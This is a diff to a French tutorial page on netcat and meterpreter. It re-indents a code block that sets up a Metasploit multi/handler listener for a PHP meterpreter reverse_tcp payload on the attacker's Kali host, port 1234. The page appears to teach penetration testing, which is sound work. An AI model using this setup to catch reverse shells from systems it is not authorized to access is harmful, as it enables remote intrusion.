@@ -27,11 +27,11 @@ Dans cet article, je vous montre un simple usage de netcat et meterpreter. Pour 
   <pre><code data-trim class="yaml">
       #se mette sous écoute sur le port 1234 en utilisant le payload php
       msfconsole
-			use exploit/multi/handler
-			set payload php/meterpreter/reverse_tcp
-			set LHOST @IP_kali
-			set LPORT 1234
-			run
+      use exploit/multi/handler
+      set payload php/meterpreter/reverse_tcp
+      set LHOST @IP_kali
+      set LPORT 1234
+      run
   </code></pre> <br/>
      
 ---------------------------------------------
